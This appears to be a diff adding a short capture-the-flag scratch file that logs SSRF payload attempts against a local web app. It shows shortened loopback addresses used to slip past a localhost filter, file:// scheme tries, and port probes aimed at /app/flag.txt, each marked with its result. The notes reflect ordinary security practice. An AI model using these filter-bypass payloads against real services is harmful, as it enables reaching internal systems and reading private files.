@@ -1,0 +1,31 @@
+http://localhost:8000	x
+http://127.0.0.1:8000	x
+http://127.0.1:8000		o
+
+http://127.0.1:8000/static/dream.png
+http://127.1:8000/static/dream.png
+	> WORKING
+
+[payload]
+http://127.0.1:8000/app/flag.txt
+	> 404 not found
+http://127.0.1:8701/app/flag.txt
+http://127.0.1:8701/static/dream.png
+	> FILTERED
+file://127.0.1:8000/app/flag.txt
+file://127.0.1:8000/static/dream.png
+	> FILTERED
+http://127.0.1:8080/app/flag.txt
+http://127.0.1:8080/static/dream.png
+	> FILTERED
+http://127.0.1:80/app/flag.txt
+http://127.0.1:80/static/dream.png
+	> FILTERED
+http://0.0.0.0/img_viewer.html
+	> FILTERED
+http://127.0.1:8000/app/img_viewer.html
+	> 404 not found
+
+http://127.0.1:1771/app/flag.txt
+	> ?? 이상한 404
+
